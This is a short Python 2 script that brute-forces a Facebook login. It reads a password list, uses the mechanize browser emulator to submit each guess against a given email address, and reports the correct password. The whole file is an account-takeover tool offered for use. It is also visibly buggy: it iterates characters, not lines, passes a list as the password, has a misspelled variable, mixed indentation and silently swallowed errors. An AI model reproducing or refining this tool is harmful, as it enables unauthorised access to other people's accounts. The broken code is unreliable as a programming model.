import mechanize

def facebook_brute():
	
	email=raw_input("Enter the email address:")
	file=open('./password_lists/passwords.txt','r')

	br=mechanize.Browser()	
	print("[+]Browser emulator initialized")
	br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)


	for password in file.readline():
		password=password.split()
		
		try:
			
        		br.open('http://facebook.com')
        		br.select_form(nr=0)
        		br.set_handle_equiv(True)
        		br.set_handle_redirect(True)
        		br.set_handle_referer(True)
        		br.set_handle_robots(False)
        		br.form['email']=email
        		br.method="POST"
			br.form['pass']=password
			response=br.submit()

			if respnse.geturl()=="https://www.facebook.com":
				print("[+] Correct password: %s" %password)

			else:
				print("[!]Incorrect password %s" %password)
		except:
			pass

facebook_brute()
